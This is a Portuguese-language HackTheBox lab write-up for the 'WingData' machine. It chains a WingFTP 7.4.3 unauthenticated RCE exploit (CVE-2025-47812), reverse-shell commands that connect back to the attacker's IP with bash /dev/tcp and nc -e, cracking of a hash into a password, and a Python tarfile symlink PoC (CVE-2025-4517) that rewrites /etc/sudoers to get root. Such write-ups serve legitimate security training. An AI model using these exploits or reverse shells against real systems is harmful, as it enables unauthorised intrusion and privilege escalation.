---
title: WingData HTB Write-up
created: 2026-04-01 22:26
tags:
  - ctf
  - hackthebox
  - walkthrough
  - pathtraversal
  - rce
  - CVE-2025-47812
  - CVE-2025-4517
draft: false
---

# Do RCE Não Autenticado ao Root via Python Tarfile Bypass (CVE-2025-4517)

![Wingdata](images/wingdata/WingData.png)

## Introdução

Olá mundo! Sejam bem-vindos à mais uma aventura hackthebox.

`WingData` é uma máquina classificada como de dificuldade fácil. Nela encontramos um servidor [[FTP]] `WingFTP` vulnerável à `CVE-2025-47812 WingFTP Server 7.4.3 - Unauthenticated Remote Code Execution`. Depois de conseguir um **backdoor** no servidor, encontramos nos arquivos de configuração do `WingFTP` a hash de senha do usuário `wacky`,. Após fazer a quebra de senha obtemos acesso ao servidor via [[SSH]] como usuário legítimo. Por fim exploramos a `CVE-2025-4517 Tarfile Exploit Privilege Escalation via Symlink + Hardlink Bypass` que abusa de uma falha no **Python** desatualizado juntamente com uma permissão `sudo` excessiva.

Estou ansioso para contar como foi, então vamos nessa!

--- 
## Reconhecimento

### Nmap Scan

O scan do [[NMAP]] retornou as portas **22** e **80** como abertas.

Comando do `Nmap`:

```bash
ports=$(nmap -p- --min-rate=1000 -T4 $IP | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
sudo nmap -Pn -p$ports -sC -sV -oA nmap/$machine -vv $IP
```

Resultado do `Nmap`:

```bash {12}
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey:
|   256 a1:fa:95:8b:d7:56:03:85:e4:45:c9:c7:1e:ba:28:3b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBL+8LZAmzRfTy+4t8PJxEvRWhPho8aZj9ImxRfWn9TKepkxh8pAF3WDu55pd/gaSUGIo9cuOvv+3r6w7IuCpqI4=
|   256 9c:ba:21:1a:97:2f:3a:64:73:c1:4c:1d:ce:65:7a:2f (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFFmcxflCAAe4LPgkg7hOxJen41bu6zaE/y08UnA4oRp
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.66
|_http-server-header: Apache/2.4.66 (Debian)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://wingdata.htb/
Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Como havia um redirecionamento ao domínio `wingdata.htb`, adicionei-o ao meu arquivo `hosts` no diretório `/etc`. Isso me permitiu acessar o site pelo nome de domínio ao invés do **IP** da máquina.

```bash title:/etc/hosts
10.129.22.29     wingdata.htb
```

### Web

![[wing-0.png | Wingdata home page]]

Ao acessar o site pelo navegador, vi que se tratava de um site de transferência de arquivos, usando criptografia para garantir a segurança e integridade dos dados.

Ao clicar no botão `Client Portal`, fui redirecionado para o subdomínio `ftp.wingdata.htb`, onde havia uma pagina de login.

![[wing-1.png | WingFTP login page]]

Para minha sorte havia uma informação importante sendo vazada no rodapé da página. Eu podia ver que a versão do produto `WingFTP` era a `7.4.3`. Saber disso me permitiu encontrar um exploit específico para essa versão.

Antes de caçar pela vulnerabilidade em si, tive a curiosidade de saber se era possível acessar o serviço como usuário `anonymous`. E era sim possível, porém não podia fazer nada pois não tinha privilégios suficientes.

![[wing-2.png | Wingdata home page]]

---
## Acesso Inicial

### CVE-2025-47812

Depois de pesquisar sobre vulnerabilidades no `WingFTP 7.4.3`, encontrei essa [POC](https://www.exploit-db.com/exploits/52347) no **Exploit-DB**. Ela abusa da falha conhecida como `CVE-2025-47812 WingFTP Server 7.4.3 - Unauthenticated Remote Code Execution`, onde o usuário pode injetar caracteres nulos (\0) e código **Lua** malicioso no campo de nome de usuário. O sistema armazena isso de forma insegura em arquivos de sessão, que depois são executados pelo servidor.

Depois de baixar o exploit, fiz um teste com o comando `whoami`.

```bash {10}
┌──(kali㉿kali)-[~/…/Hackthebox/Easy/WingData/tools]
└─$ python3 52347.py -u http://ftp.wingdata.htb/ -c 'whoami' -U anonymous

[*] Testing target: http://ftp.wingdata.htb/
[+] Sending POST request to http://ftp.wingdata.htb//loginok.html with command: 'whoami' and username: 'anonymous'
[+] UID extracted: 6cfb14180fab39dddaead2456bc2cfb2f528764d624db129b32c21fbca0cb8d6
[+] Sending GET request to http://ftp.wingdata.htb//dir.html with UID: 6cfb14180fab39dddaead2456bc2cfb2f528764d624db129b32c21fbca0cb8d6

--- Command Output ---
wingftp
----------------------
```

Funcionou perfeitamente. Então deixei meu `Netcat` escutando na rede na porta **9001** e rodei o exploit outra vez, só que com o comando `bash -c 'bash -i >& /dev/tcp/10.10.15.250/9001 0 >& 1'`.

```bash {10}
┌──(kali㉿kali)-[~/…/Hackthebox/Easy/WingData/tools]
└─$ python3 52347.py -u http://ftp.wingdata.htb/ -c "bash -c 'bash -i >& /dev/tcp/10.10.15.250/9001 0 >& 1'" -U anonymous

[*] Testing target: http://ftp.wingdata.htb/
[+] Sending POST request to http://ftp.wingdata.htb//loginok.html with command: 'bash -c 'bash -i >& /dev/tcp/10.10.15.250/9001 0 >& 1'' and username: 'anonymous'
[+] UID extracted: f8b05d9414445a16bd0fcbc5556df3e7f528764d624db129b32c21fbca0cb8d6
[+] Sending GET request to http://ftp.wingdata.htb//dir.html with UID: f8b05d9414445a16bd0fcbc5556df3e7f528764d624db129b32c21fbca0cb8d6

--- Command Output ---
session expired
----------------------
```

Só que não funcionou. Por que? Sinceramente, não sei. Talvez tenha sido por causa dos caracteres especiais que não foram "escapados", como por exemplo o '&', que pode quebrar a lógica e fazer como que o comando seja dividido em dois. Seja como for, eu usei o próprio `Netcat` nativo do sistema para criar uma shell reversa.

```bash
┌──(kali㉿kali)-[~/…/Hackthebox/Easy/WingData/tools]
└─$ python3 52347.py -u http://ftp.wingdata.htb/ -c 'nc 10.10.15.250 9001 -e /bin/bash' -U anonymous

[*] Testing target: http://ftp.wingdata.htb/
[+] Sending POST request to http://ftp.wingdata.htb//loginok.html with command: 'nc 10.10.15.250 9001 -e /bin/bash' and username: 'anonymous'
[+] UID extracted: b6140d6e4aa3ac9fc58d2a2b3b0b6aecf528764d624db129b32c21fbca0cb8d6
[+] Sending GET request to http://ftp.wingdata.htb//dir.html with UID: b6140d6e4aa3ac9fc58d2a2b3b0b6aecf528764d624db129b32c21fbca0cb8d6

```

O exploit congelou sem mostrar o output, o que significa que deu certo a conexão com meu `Netcat`.

```bash
┌──(kali㉿kali)-[~/Boxes/Hackthebox/Easy/WingData]
└─$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.15.250] from (UNKNOWN) [10.129.22.29] 59678
id
uid=1000(wingftp) gid=1000(wingftp) groups=1000(wingftp),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev)
```

Estabilizei minha shell reversa para poder usar os comandos `clear` e `CTRL + C`. Daí comecei a caçar por credenciais expostas em arquivos.

---
## Escalação de Privilégios

### Shell como wacky

Procurando nos diretórios do `WingFTP`, encontrei dois arquivos interessantes:

* O primeiro é o `wacky.xml`, que foi encontrado em `/opt/wftpserver/Data/1/users/wacky.xml`
* O segundo é o `settings.xml`, que foi encontrado no diretório anterior ao primeiro arquivo encontrado.
Esses arquivos são interessantes porque foi onde encontrei um **hash de senha** e o **Salt**. O hash estava encriptado em `SHA-256`.

Infelizmente não consegui quebrar com minha **VM** usando o `john the ripper`. No entanto foi possível quebrar usando o `Hashcat` na máquina host.

```bash {3}
hashcat.exe -m 1410 hash rockyou.txt
--- REDACTED ---
32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP:!#7Blushing^*Bride5 
```

Com a senha em mãos eu só precisava confirmar se  `wacky` era um usuário válido do servidor. Então usei o comando `cat /etc/passwd | grep sh$` para retornar todos os usuários que possuem um shell **bash**.

```bash {3}
root:x:0:0:root:/root:/bin/bash
wingftp:x:1000:1000:WingFTP Daemon User,,,:/opt/wingftp:/bin/bash
wacky:x:1001:1001::/home/wacky:/bin/bash
```

Usando a senha encontrada `!#7Blushing^*Bride5` com o usuário `wacky` no [[SSH]], me permitiu entrar no servidor como usuário válido do sistema.

```bash
┌──(kali㉿kali)-[~/Boxes/Hackthebox/Easy/WingData]
└─$ ssh wacky@wingdata.htb
wacky@wingdata.htb's password:
Linux wingdata 6.1.0-42-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.159-1 (2025-12-30) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Mar 29 22:33:52 2026 from 10.10.15.250
wacky@wingdata:~$
```

Nesse momento eu aproveitei para pegar a flag do usuário.

```bash 
wacky@wingdata:~$ cat user.txt
5a8999dfcf07f8b9cb3d9e0bb734a8e4
```

### Shell como root

Verificando as permissões de `sudo` com o comando `sudo -l`, descobri que o usuário `wacky` podia rodar um script python para fazer backup de arquivos, com privilégios de `root` e sem senha.

```bash {9}
wacky@wingdata:~$ sudo -l
Matching Defaults entries for wacky on wingdata:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User wacky may run the following commands on wingdata:
    (root) NOPASSWD: /usr/local/bin/python3
        /opt/backup_clients/restore_backup_clients.py *
```

Seria extremamente perigoso se, de repente, alguém explorasse essa permissão excessiva para criar links simbólicos e fazer backups de arquivos que só o `root` poderia ler. Isso eu já tinha feito em outras máquinas no passado e parecia uma boa ideia. Então copiei o código e pedi pro **chatGPT** analizar. Ele disse o seguinte:

```markdown
# ⚠️ Potential Security Issues

## 1. 🧨 Tar Extraction Risks (Still the biggest concern)

Even though you used:

tar.extractall(path=staging_dir, filter="data")

That’s **good**, but not bulletproof depending on Python version.

### Why this matters:

Historically, `tarfile.extractall()` is vulnerable to:

- Path traversal (`../../etc/passwd`)
- Symlink attacks
- Overwriting arbitrary files

### About `filter="data"`:

- Introduced in newer Python versions (3.12+)
- It **blocks dangerous members** (like absolute paths, links, etc.)

### ⚠️ Risk:

If this script runs on **older Python versions**, `filter="data"`:

- Either **does nothing** or
- Might not exist → fallback to unsafe behavior
```

Como eu havia imaginado, a exploração ia envolver **Symlinks**, **Path Traversal** e **Arbitrary File Write**. E segundo o **chaGPT** a vulnerabilidade dependia da versão do **Python**. 

Olhando a versão do **Python** pude confirmar que era vulnerável a `CVE-2025-4517 Tarfile Exploit Privilege Escalation via Symlink + Hardlink Bypass`. Essa falha permite que um invasor escreva arquivos arbitrariamente fora do diretorio de extração ao processar arquivos `TAR` não confiáveis com `filter="data"` ou `filter="tar"` causando "**Path Traversal**".

Parecia bem promissor, então baixei uma [POC](https://github.com/AzureADTrent/CVE-2025-4517-POC/blob/main/README.md) do **Github**.

```bash
┌──(kali㉿kali)-[~/…/Hackthebox/Easy/WingData/tools]
└─$ wget https://raw.githubusercontent.com/AzureADTrent/CVE-2025-4517-POC/refs/heads/main/CVE-2025-4517-POC.py
--2026-03-29 23:56:36--  https://raw.githubusercontent.com/AzureADTrent/CVE-2025-4517-POC/refs/heads/main/CVE-2025-4517-POC.py
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.110.133, 185.199.111.133, 185.199.108.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.110.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 6973 (6.8K) [text/plain]
Saving to: ‘CVE-2025-4517-POC.py’

CVE-2025-4517-POC.py 100%[====================>]   6.81K  --.-KB/s    in 0s

2026-03-29 23:56:37 (15.2 MB/s) - ‘CVE-2025-4517-POC.py’ saved [6973/6973]
```

E transferí para o servidor alvo.

```bash title:"kali machine"
┌──(kali㉿kali)-[~/…/Hackthebox/Easy/WingData/tools]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.22.58 - - [29/Mar/2026 23:57:30] "GET /CVE-2025-4517-POC.py HTTP/1.1" 200 -
^C
Keyboard interrupt received, exiting.
```

```bash title:"ubuntu server"
wacky@wingdata:/tmp$ wget http://10.10.15.250/CVE-2025-4517-POC.py
--2026-03-29 22:57:44--  http://10.10.15.250/CVE-2025-4517-POC.py
Connecting to 10.10.15.250:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 6973 (6.8K) [text/x-python]
Saving to: ‘CVE-2025-4517-POC.py’

CVE-2025-4517-POC.py 100%[=====================>]   6.81K  --.-KB/s    in 0.006s

2026-03-29 22:57:44 (1.18 MB/s) - ‘CVE-2025-4517-POC.py’ saved [6973/6973]

wacky@wingdata:/tmp$ ls
CVE-2025-4517-POC.py
```

Por fim rodei o script Python e me tornei `root`.

```bash {38,39}
wacky@wingdata:/tmp$ python3 CVE-2025-4517-POC.py

╔═══════════════════════════════════════════════════════════╗
║     CVE-2025-4517 Tarfile Exploit                         ║
║     Privilege Escalation via Symlink + Hardlink Bypass    ║
╚═══════════════════════════════════════════════════════════╝

[*] Target user: wacky
[*] Creating exploit tar for user: wacky
[*] Phase 1: Building nested directory structure...
[*] Phase 2: Creating symlink chain for path traversal...
[*] Phase 3: Creating escape symlink to /etc...
[*] Phase 4: Creating hardlink to /etc/sudoers...
[*] Phase 5: Writing sudoers entry...
[+] Exploit tar created: /tmp/cve_2025_4517_exploit.tar
[*] Deploying exploit to: /opt/backup_clients/backups/backup_9999.tar
[+] Exploit deployed successfully
[*] Triggering extraction via vulnerable script...
[+] Backup: backup_9999.tar
[+] Staging directory: /opt/backup_clients/restored_backups/restore_pwn_9999
[+] Extraction completed in /opt/backup_clients/restored_backups/restore_pwn_9999

[+] Extraction completed
[*] Verifying exploit success...
[+] SUCCESS! User 'wacky' added to sudoers
[+] Entry: wacky ALL=(ALL) NOPASSWD: ALL

============================================================
[+] EXPLOITATION SUCCESSFUL!
[+] User 'wacky' now has full sudo privileges
[+] Get root with: sudo /bin/bash
============================================================

[?] Spawn root shell now? (y/n): y

[*] Spawning root shell...
[*] Run: sudo /bin/bash
root@wingdata:/tmp# whoami
root
```

Para completar, peguei a flag do `root`.

```bash
root@wingdata:~# cat root.txt
33297631559f12b3db1ef6af1dc0a84c
```

---

## Conclusão

![[WingDataFinal.png | Wingdata proof of pwn]]

Essa máquina foi bem divertida e enfatizou a importância de se ter uma boa política de atualizações, principalmente no caso de existir `CVEs` críticas que podem comprometer toda a infraestrutura de uma organização.

Em caso de vazamentos de dados sensíveis, uma organização nessa situação poderia sofrer pesadas multas por parte do governo e processos por parte dos clientes. Além disso, uma organização também deve priorizar a política do menor privilégio. Assim um usuário comprometido não teria privilégios excessivos que permitissem uma escalada vertical dentro da rede.




